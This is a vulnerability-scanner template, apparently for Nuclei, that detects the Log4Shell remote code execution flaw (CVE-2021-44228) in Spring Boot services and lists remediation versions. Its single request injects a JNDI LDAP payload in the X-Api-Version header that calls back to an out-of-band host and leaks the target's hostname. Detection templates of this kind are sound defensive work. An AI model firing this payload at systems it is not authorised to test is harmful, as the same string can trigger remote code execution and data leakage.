id: springboot-log4j-rce
info:
  author: pdteam
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-502
  name: Spring Boot Log4j Remote Code Injection
  reference:
  - https://logging.apache.org/log4j/2.x/security.html
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0
    (for Java 8 and later).
  severity: critical
  tags: springboot,rce,oast,log4j
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Api-Version: ${jndi:ldap://${hostName}.{{interactsh-url}}}

    '
